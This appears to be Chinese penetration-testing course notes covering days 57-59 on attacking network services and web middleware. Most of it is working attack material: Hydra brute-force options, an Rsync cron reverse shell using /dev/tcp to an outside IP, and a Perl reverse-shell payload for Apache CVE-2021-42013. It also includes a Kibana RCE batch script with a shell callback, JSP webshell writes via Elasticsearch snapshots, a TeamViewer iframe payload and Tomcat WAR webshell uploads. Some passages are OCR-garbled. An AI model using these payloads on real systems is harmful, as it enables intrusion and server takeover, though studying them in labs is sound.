<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST http://123.58.236.76:31556/yz.jsp/yz jsp/1-d&#x27;</span><br><span class="line">[&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte【】</span><br><span class="line">&#123;47,116,101,115,116,46,106,115,112)》，new String(new byte【】</span><br><span class="line">(114,119))).write(request.getParameter(new String(new byte[(102))).getBytes（）;</span><br><span class="line">%&gt;&quot;-&quot;test&quot;</span><br><span class="line">curl -XPUT &#x27;http://123.58.236.76:31556/snapshot/yz.jsp&#x27;-d&#x27;</span><br><span class="line">&quot;type&quot;.&quot;fs&quot;,</span><br><span class="line">&quot;settings&quot;:&#123;</span><br><span class="line">&quot;location&quot;:&quot;/usr/local/tomcat/webapps/wwwroot/&quot;,</span><br><span class="line">&quot;compress&quot;:false</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3.、访问8080端口snapshot–yz jspi文件写入代码到test jsp中<br><a target="_blank" rel="noopener" href="http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz">http://123.58.236.76:31557/wwwroot/indices/yz.jsp/snapshot-yz</a> jsp?f&#x3D;success<br><a target="_blank" rel="noopener" href="http://123.58.236.76:31557/wwwroot/test.jsp">http://123.58.236.76:31557/wwwroot/test.jsp</a></p>
<h1 id="第57天-服务攻防-应用协议-Rsync-SSH-RDP-FTP-漏洞批量扫描-口令拆解"><a href="#第57天-服务攻防-应用协议-Rsync-SSH-RDP-FTP-漏洞批量扫描-口令拆解" class="headerlink" title="第57天 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批量扫描&amp;口令拆解"></a>第57天 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批量扫描&amp;口令拆解</h1><h4 id="知识点：-37"><a href="#知识点：-37" class="headerlink" title="知识点："></a>知识点：</h4><p>1、服务攻防-远程控制&amp;文件传输等<br>2、远程控制-RDP&amp;RDP&amp;弱口令&amp;漏洞<br>3、文件传输-FTP&amp;Rsyc&amp;弱口令&amp;漏洞</p>
<h4 id="章节内容：-3"><a href="#章节内容：-3" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见服务应用的安全测试：<br>1、配置不当-未授权访问<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击</p>
<h4 id="前置知识：-6"><a href="#前置知识：-6" class="headerlink" title="前置知识："></a>前置知识：</h4><p>应用服务安全测试流程：见图<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传箱&amp;通讯等<br>3、判断服务利用方式特定漏洞&amp;未授权&amp;弱口令等</p>
<h4 id="演示案例：-33"><a href="#演示案例：-33" class="headerlink" title="演示案例："></a>演示案例：</h4><p>口令猜解-Hydra-FTP&amp;RDP&amp;SSH<br>配置不当-未授权访问-Rsync文件备份<br>高端课程-直接搜哈-MSF&amp;Fofaviewer<br>协议漏洞-应用软件-FTP&amp;Proftpd搭建<br>协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</p>
<h4 id="口令猜解-Hydra-FTP-RDP-SSH"><a href="#口令猜解-Hydra-FTP-RDP-SSH" class="headerlink" title="口令猜解-Hydra-FTP&amp;RDP&amp;SSH"></a><strong>口令猜解-Hydra-FTP&amp;RDP&amp;SSH</strong></h4><p><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p>
<p>hydra是一个自动化的爆破工具，暴力破解弱密码，  也是之前第52天讲到过的工具了这个是。<br>是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-l login 小写，指定用户名进行破解</span><br><span class="line">-L file 大写，指定用户的用户名字典</span><br><span class="line">-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。</span><br><span class="line">-P file 大写，用于指定密码字典。</span><br><span class="line">-C使用冒号分割格式，例如“登录名:密码”来代替 -L/-P 参数</span><br><span class="line">-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</span><br><span class="line">-M file 指定目标ip列表文件，批量破解。</span><br><span class="line">-o file 指定结果输出文件</span><br><span class="line">-f 找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t tasks 同时运行的线程数，默认是16</span><br><span class="line">-S大写，采用SSL链接</span><br><span class="line">-s PORT 指定默认端口</span><br><span class="line">-w time 设置最大超时时间，单位</span><br><span class="line">-v / -V 显示详细过程</span><br><span class="line">-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）</span><br><span class="line">-x 自定义密码。</span><br></pre></td></tr></table></figure>

<h4 id="配置不当-未授权访问-Rsync文件备份"><a href="#配置不当-未授权访问-Rsync文件备份" class="headerlink" title="配置不当-未授权访问-Rsync文件备份"></a>配置不当-未授权访问-Rsync文件备份</h4><p>rsync是Linux下一款数据备份工具，支持通过rSnc协议、ssh协议进行远程文件传输。其<br>中rsynct协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密<br>码，我们将可以读写目标服务器文件。<br>判断：rsync rsync:∥123.58.236.76:45854&#x2F;<br>利用：<br>-读取文件：rsync rsync:&#x2F;123.58.236.76:45854&#x2F;src&#x2F;<br>-下载文件：rsync rsync:&#x2F;123.58.236.76.45854&#x2F;src&#x2F;etc&#x2F;passwd&#x2F;<br>-上传文件：rsync-av passwd rsync:&#x2F;123.58.236.76:45854&#x2F;src&#x2F;tmp&#x2F;passwd<br>反弹shell:<br>1、获取信息：<br>rsync rsync:&#x2F;&#x2F;123.58.236.76:12177&#x2F;src&#x2F;etc&#x2F;crontab &#x2F;root&#x2F;cron.txt<br>2.创建文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">touch shell</span><br><span class="line">#!/bin/bash</span><br><span class="line">/bin/bash-i&gt;&amp;/dev/tcp/47.94.236.117/55660&gt;&amp;1</span><br><span class="line">chmod +x shell</span><br></pre></td></tr></table></figure>

<p>3、上传文件<br>rsync -av shell rsync:&#x2F;&#x2F;123.58.236.76:12177&#x2F;src&#x2F;etc&#x2F;cron.hourly<br>4、等待接受反弹</p>
<h4 id="高端课程-直接搜哈-MSF-Fofaviewer"><a href="#高端课程-直接搜哈-MSF-Fofaviewer" class="headerlink" title="高端课程-直接搜哈-MSF&amp;Fofaviewer"></a>高端课程-直接搜哈-MSF&amp;Fofaviewer</h4><p><a target="_blank" rel="noopener" href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a><br>msfconsole<br>use auxiliary&#x2F;scanner&#x2F;rsync&#x2F;modules_list<br>set rhosts file:&#x2F;root&#x2F;ips.txt<br>set threads 10<br>run<br>思路：使用fofa查询端口为873的资产，使用msf批量扫描目的资产</p>
<h4 id="协议漏同-应用软件-FTP-Proftpd搭建"><a href="#协议漏同-应用软件-FTP-Proftpd搭建" class="headerlink" title="协议漏同-应用软件-FTP&amp;Proftpd搭建"></a>协议漏同-应用软件-FTP&amp;Proftpd搭建</h4><p><a target="_blank" rel="noopener" href="https://github.com/tokx/exploit-CVE-2015-3306">https://github.com/tokx/exploit-CVE-2015-3306</a><br>python exploit.py –host 123.58.236.76–port 24967–path “&#x2F;var&#x2F;www&#x2F;html&#x2F;”<br><a href="http://123:58.236:76.19758/backdoorphp?cmd=id">http://123:58.236:76.19758/backdoorphp?cmd=id</a></p>
<h4 id="协议漏洞-应用软件-SSH-libssh-Openssh"><a href="#协议漏洞-应用软件-SSH-libssh-Openssh" class="headerlink" title="协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh"></a>协议漏洞-应用软件-SSH&amp;libssh&amp;Openssh</h4><p>openssh CVE-2014-0160CVE-2018-15473cve202015778<br>CVE-2014-0160版本很少<br>cve_2020_15778价值不高（需要普通用户账号密码，可以返回shell但是权限仍是普通用户）<br>环境效果：不可以ssh连接，可以使用scp</p>
<p>CVE-2018-15473-用户名枚举<br><a target="_blank" rel="noopener" href="https://github.com/Rhynorater/CVE-2018-15473-Exploit">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip3 install-r requirements.txt</span><br><span class="line">pip3 install paramiko==2.4.1</span><br><span class="line">python sshUsernameEnumExploit.py –port 32013 –userList examplelnput.txt</span><br><span class="line">123.58.236.76</span><br></pre></td></tr></table></figure>

<h1 id="第58天-服务攻防-应用协议-设备Kibana-Zabbix-远控向日葵-VNC-TV"><a href="#第58天-服务攻防-应用协议-设备Kibana-Zabbix-远控向日葵-VNC-TV" class="headerlink" title="第58天 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV"></a>第58天 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV</h1><h4 id="知识点：-38"><a href="#知识点：-38" class="headerlink" title="知识点："></a>知识点：</h4><p>1、远程控制第三方应用安全<br>2、三方应用-向日葵&amp;VNC&amp;TV<br>3、设备平台-Zabbix&amp;Kibanai漏洞</p>
<h4 id="章节内容：-4"><a href="#章节内容：-4" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见版务应用的安全测试：<br>1、配置不当-未授权访问<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令侵破攻击</p>
<h4 id="前置知识：-7"><a href="#前置知识：-7" class="headerlink" title="前置知识："></a>前置知识：</h4><p>应用服务安全测试流程：见图<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式特定漏洞8未授权&amp;弱口令等</p>
<h4 id="演示案例：-34"><a href="#演示案例：-34" class="headerlink" title="演示案例："></a>演示案例：</h4><p>远程控制-向日葵&amp;Vnc&amp;Teamviewer<br>设备平台-Zabbix-CVE-2022-23131<br>设备平台-Kibana-CVE-2019-7609</p>
<h4 id="远程控制-向日葵-Vnc-Teamviewer"><a href="#远程控制-向日葵-Vnc-Teamviewer" class="headerlink" title="远程控制-向日葵&amp;Vnc&amp;Teamviewer"></a>远程控制-向日葵&amp;Vnc&amp;Teamviewer</h4><p>-向日葵RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Mr-xn/sunlogin_rce</span><br><span class="line">xrkRce.exe -h 192.168.46.157 -t scan</span><br><span class="line">xrkRce.exe -h 192.168.46.157-t rce-p 49712-c “ipconfig”</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令说明：</span><br><span class="line">-h 指定目标</span><br><span class="line">-t 选择扫描或者命令执行 默认scan</span><br><span class="line">-p 设置扫描端口范围 默认4w到65535</span><br><span class="line">-c 需要执行的命令</span><br></pre></td></tr></table></figure>

<p>-VNC口令问题&amp;未授权<br>MSF内置口令及未授权测试</p>
<p>-Teamviewer</p>
<blockquote>
<p>需要满足亮点两点：1、主机安装Teamviewer 2、管理员点击访问构造好的链接</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">stitle&gt;cv2020-13699/itle&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome to xiaodil<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;height:1px;width:1px;&quot;</span><span class="attr">src</span>=<span class="string">&#x27;teamviewer10:--play Wattacker-</span></span></span><br><span class="line"><span class="string"><span class="tag">IP\sharelfake.tvs&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="设备平台-Zabbix-CVE-2022-23131"><a href="#设备平台-Zabbix-CVE-2022-23131" class="headerlink" title="设备平台-Zabbix-CVE-2022-23131"></a>设备平台-Zabbix-CVE-2022-23131</h4><p>Zabbiⅸ是由Alexei Vladishev开发的一种网络监视、管理系统，基于Server-Client架构。<br>是一款服务器监控软件，其由server、.agent、,web等模块组成，其中web模块由PHP编<br>写，用来显示数据库中的结果。默认端口：10051红<br>Zabbix CVE-2022-23131登录绕过漏洞复现<br><a target="_blank" rel="noopener" href="https://github.com/LOading-x/cve-2022-23131">https://github.com/LOading-x/cve-2022-23131</a><br>python3 zabbix.py target Admin<br>然后修改Cookie,使用saml登录即可<br>CVE-2017-2824CVE-2020-11800</p>
<p>获取权限后续利用：1、添加反弹shell脚本–2、服务器执行脚本–3、获取服务器权限</p>
<p>添加反弹shell脚本</p>
<p>找到服务器配置处</p>
<p>运行脚本</p>
<h4 id="设备平台-Kibana-CVE-2019-7609"><a href="#设备平台-Kibana-CVE-2019-7609" class="headerlink" title="设备平台-Kibana-CVE-2019-7609"></a>设备平台-Kibana-CVE-2019-7609</h4><p>Kibanai为Elassticsearch设计的一款开源的视图工具。其5.6.15和6.6.1之前的版本中存在一<br>处原型链污染漏洞，利用泥洞可以在目标服务器上执行任意代码。默认端口：5601<br><a target="_blank" rel="noopener" href="https://github.com/LandGrey/CVE-2019-7609">https://github.com/LandGrey/CVE-2019-7609</a><br>es(*).props(label._proto_env.AAAA&#x3D;‘require(“child_process”).exec(“&#x2F;bin&#x2F;touch<br>&#x2F;tmp&#x2F;success”):process.exit（）&#x2F;&#x2F;).props(label._proto.env.NODE_OPTIONS&#x3D;’–require<br>&#x2F;proc&#x2F;self&#x2F;environ’)</p>
<p>脚本批量探测</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;ips.txt&#x27;</span>);</span><br><span class="line">	ip=ip.strip() <span class="comment">#换行符</span></span><br><span class="line">	cmdline=<span class="string">&#x27;D:\python2.7\python.exe CVE-2019-7605-kibana-rce.py -u %s -host 41.94.236.117 -port 5566 --shell&#x27;</span> %ip</span><br><span class="line">	os.system(cmdline)</span><br></pre></td></tr></table></figure>

<h1 id="第59天-服务攻防-中间件安全-CVE复现-lS-Apache-Tomcata-Nginx"><a href="#第59天-服务攻防-中间件安全-CVE复现-lS-Apache-Tomcata-Nginx" class="headerlink" title="第59天 服务攻防-中间件安全&amp;CVE复现&amp;lS&amp;Apache&amp;Tomcata&amp;Nginx"></a>第59天 服务攻防-中间件安全&amp;CVE复现&amp;lS&amp;Apache&amp;Tomcata&amp;Nginx</h1><h4 id="知识点：-39"><a href="#知识点：-39" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>1、中间件-IIS短文件&amp;解析&amp;蓝屏等<br>2、中间件-Nginx-文件解析&amp;命令执行等<br>3、中间件-Apache-RCE&amp;目录遍历&amp;文件解析等<br>4、中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等</p>
<h4 id="章节内容：-5"><a href="#章节内容：-5" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用框架特定安全漏洞</p>
<h4 id="前置知识：-8"><a href="#前置知识：-8" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全侧试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断仲间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞<br>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式持定漏洞&amp;未授权&amp;弱口令等</p>
<h4 id="演示案例：-35"><a href="#演示案例：-35" class="headerlink" title="演示案例："></a>演示案例：</h4><p>中间件IIS-短文件&amp;解析&amp;蓝屏等<br>中间件-Nginx-文件解析&amp;命令执行等<br>中间件-Apache-RCE&amp;目录遍历&amp;文件解析等<br>中间件。Tomcat-弱口令&amp;文件上传&amp;文件包含等<br>中间件-Apache RCE&amp;Fofa Viewer-走向高端啊</p>
<h4 id="中间件IIS短文件-解析-蓝屏等"><a href="#中间件IIS短文件-解析-蓝屏等" class="headerlink" title="中间件IIS短文件&amp;解析&amp;蓝屏等"></a>中间件IIS短文件&amp;解析&amp;蓝屏等</h4><blockquote>
<p>Internet Information Services（IIS，以前称为Internet Information Server）互联网信息服务是Microsoft公司提供的可扩展Web服务器，支持HTTP，HTTP&#x2F;2，HTTPS，FTP，FTPS，SMTP和NNTP等。起初用于Windows NT系列，随后内置在Windows 2000、Windows XP Professional、Windows Server 2003和后续版本一起发行，但在Windows XP Home版本上并没有IIS。IIS目前只适用于Windows系统，不适用于其他操作系统。</p>
</blockquote>
<p>1、短文件：信息收集 参考链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a><br>2、文件解析：还有点用<br>3、HTTP.SYS:蓝屏崩溃<br>4、CVE-2017-7269条件过老<br>其他IIS漏洞参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52486507/article/details/129863950">https://blog.csdn.net/qq_52486507/article/details/129863950</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IIS是Windows上的一个中间件，现在用到的已经算是比较少的了。</span><br></pre></td></tr></table></figure>

<h4 id="中间件-Nginx-文件解析-命令执行等"><a href="#中间件-Nginx-文件解析-命令执行等" class="headerlink" title="中间件-Nginx-文件解析&amp;命令执行等"></a>中间件-Nginx-文件解析&amp;命令执行等</h4><p>vulhub开启环境</p>
<p>上传图片文件–通过burp在文件中加入phpinfo()语句</p>
<p>访问图片，在图片后面加上 &#x2F;.php语句被成功解析并执行：</p>
<p>可利用此来上传木马，从而进行getshell<br>上传一句话木马</p>
<p>使用hackbar执行phpinfo();</p>
<h4 id="Nginx-文件名逻辑漏洞"><a href="#Nginx-文件名逻辑漏洞" class="headerlink" title="Nginx 文件名逻辑漏洞"></a>Nginx 文件名逻辑漏洞</h4><p>漏洞原理：</p>
<blockquote>
<p>主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p>
</blockquote>
<p>vulhub启动环境：</p>
<p>上传gif图片文件，通过burp抓包插入pnpinfo();<br>然后在文件名后缀加入空格</p>
<p>再用过浏览器访问上传图片后返回的文件路径，因为在文件名后加了空格所以直接访问不到<br>再抓包在文件名后加两个空格和.php(&#x2F;uploadfiles&#x2F;1.jpg )–然后修改空格16进制为00</p>
<p>最后返回PHP info内容</p>
<h4 id="中间件-Apache-RCE-目录遍历-文件解析等"><a href="#中间件-Apache-RCE-目录遍历-文件解析等" class="headerlink" title="中间件-Apache-RCE&amp;目录遍历&amp;文件解析等"></a>中间件-Apache-RCE&amp;目录遍历&amp;文件解析等</h4><p>Apache HTTP Server是美国阿帕奇(Apache)基金会的一款开源网页服务器。该服务器<br>具有快速、可靠且可通过简单的API进行扩充的特点，发现Apache HTTP Server2.4.50<br>中针对CVE-2021-41773的修复不够充分。攻击者可以使用路径遍历攻击将URL映射到<br>由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置<br>要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了CG引脚<br>本，则这可能允许远程代码执行。此问题仅影响Apache2.4.49和Apache2.4.50,而不<br>影响更早版本。</p>
<h6 id="1、Cve-2021-42013RCE"><a href="#1、Cve-2021-42013RCE" class="headerlink" title="1、Cve-2021-42013RCE"></a>1、Cve-2021-42013RCE</h6><p>P0ST &#x2F;cgi-bin.%%32%651.%%32%65&#x2F;.%%32%651.%%32%65bin&#x2F;sh<br>echo;perl -e ‘use Socket:Si&#x3D;“47.94.236.117”;<br>Sp&#x3D;5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,socka<br>ddr_in(Sp,inet_aton(Si))))<br>[open(STDIN,“&gt;&amp;S”):open(STDOUT,“&gt;&amp;S”);open(STDERR,“&gt;&amp;S”):exec(&#x2F;bin&#x2F;sh -i”)😉</p>
<p>使用.%%32%65进行绕过（注意其中的&#x2F;icons&#x2F;必须是一个存在且可访问的目录）：</p>
<p>可见，成功读取到&#x2F;etc&#x2F;passwd：</p>
<p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data &quot;echo;id&quot; &#x27;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<h6 id="2、CVE-2021-41773目录穿越"><a href="#2、CVE-2021-41773目录穿越" class="headerlink" title="2、CVE-2021-41773目录穿越"></a>2、CVE-2021-41773目录穿越</h6><p>Apache HTTP Server2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏<br>洞，攻击者可利用该漏洞读取到Wb目录外的其他文件，如系统配置文件、网站源码等，<br>甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。<br>Burp:ic0ns&#x2F;.%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%<br>%32%65&#x2F;etc&#x2F;passwd</p>
<h6 id="3、Cve-2017-15715文件解析"><a href="#3、Cve-2017-15715文件解析" class="headerlink" title="3、Cve-2017-15715文件解析"></a>3、Cve-2017-15715文件解析</h6><p>Apache HTTPD:是一款HTTP服务器。其2.4.0~2.4.29版本存在一个解析漏洞，在解析PHP<br>时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策路。</p>
<p>Cve-2017-15715文件解析漏洞复现：</p>
<p>启动环境</p>
<p>在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A），不再拦截<br>注意添加的位置，可以先手动在文件名后加空格，然后切换到16进制将20改为0a。</p>
<p>访问刚才上传的&#x2F;evil.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：</p>
<p>4、Cve2017-9798价值不高<br>5、Cve_2018_11759价值不高I<br>6、Cve_2021-37580插件问题</p>
<h4 id="中间件Tomcat-弱口令-文件上传-文件包含等"><a href="#中间件Tomcat-弱口令-文件上传-文件包含等" class="headerlink" title="中间件Tomcat-.弱口令&amp;文件上传&amp;文件包含等"></a>中间件Tomcat-.弱口令&amp;文件上传&amp;文件包含等</h4><p>简介：</p>
<blockquote>
<p>Tomcat是Apache软件基金会（Apache Software Foundation）的Jakarta项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java爱好者的喜爱并得到了部分软件开发商的认可，成为比较流行的Web 应用服务器。</p>
</blockquote>
<h6 id="1、弱口令猜解"><a href="#1、弱口令猜解" class="headerlink" title="1、弱口令猜解"></a>1、弱口令猜解</h6><p>配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell</p>
<h5 id="弱口令漏洞复现"><a href="#弱口令漏洞复现" class="headerlink" title="弱口令漏洞复现"></a>弱口令漏洞复现</h5><p>vulhub启动环境：</p>
<p>访问ip:8080 点击Manager APP登录，弱口令为tomcat&#x2F;tomcat</p>
<p>getshell：首先使用哥斯拉生成jsp后门，然后将jsp文件压缩为zip文件，再通过修改后缀的方式改为.war文件</p>
<p>在tomcat上传点上传war文件，通过返回信息查看上传状态</p>
<p>访问<a target="_blank" rel="noopener" href="http://192.168.74.132/222/222.jsp">http://192.168.74.132/222/222.jsp</a> 文件存在 ，使用哥斯拉连接获得服务器权限</p>
<h6 id="2、CVE-2017-12615文件上传"><a href="#2、CVE-2017-12615文件上传" class="headerlink" title="2、CVE-2017-12615文件上传"></a>2、CVE-2017-12615文件上传</h6><p>当存在漏洞的Tomcati运行在Nindows&#x2F;Linux主机上，且启用了HTTP PUT请求方法（例<br>如，将readonly初始化参数由默认值设置为false),攻击者将有可能可通过精心构造的<br>攻击情求数据包向服务器上传包含任意代码的JSP的webshell文件，JSP文件中的恶意代码<br>将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。<br>影响版本Apache Tomcat7.0.0-7.0.79<br>PUT &#x2F;1.jsp&#x2F;HTTP&#x2F;1.1<br>shell代码</p>
<h6 id="3、cve-2020-1938文件包含（脚本执行）"><a href="#3、cve-2020-1938文件包含（脚本执行）" class="headerlink" title="3、cve-2020-1938文件包含（脚本执行）"></a>3、cve-2020-1938文件包含（脚本执行）</h6><p>Apache Tomcat AJP协议(默认8009端口)由于存在实现缺陷导致相关参数可控，攻击者<br>利用该漏洞可通过构造特定参数，读取服务器vebapp目录下的任意文件。若服务器端同时<br>存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。<br>漏洞影响的产品版本包括：<br>Tomcat 6].*<br>Tomcat7.&lt;7.0.100<br>Tomcat8.&lt;8.5.51<br>Tomcat9.*&lt;9.0.31<br><a target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a><br>D:\Python27\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76-p 63667-f<br>WEB-INF&#x2F;web.xml</p>
<h6 id="4、Cve202011996拒绝服务"><a href="#4、Cve202011996拒绝服务" class="headerlink" title="4、Cve202011996拒绝服务"></a>4、Cve202011996拒绝服务</h6><p>危害过大，权限无关，意义不大</p>
<h6 id="5、Cve20209484反序列化"><a href="#5、Cve20209484反序列化" class="headerlink" title="5、Cve20209484反序列化"></a>5、Cve20209484反序列化</h6><p>利用条件太司刻，意义不大</p>
<h4 id="中间件-Fofaviewer-Apache-RCE-走向高端啊"><a href="#中间件-Fofaviewer-Apache-RCE-走向高端啊" class="headerlink" title="中间件-Fofaviewer&amp;Apache_RCE-走向高端啊"></a>中间件-Fofaviewer&amp;Apache_RCE-走向高端啊</h4><p>server&#x3D;“Apache&#x2F;2.4.49”<br>视频中未进行演示推测具体的流程为：<br>1、使用fofaview进行目标资产收集<br>2、编写python脚本进行批量化漏洞探测</p>
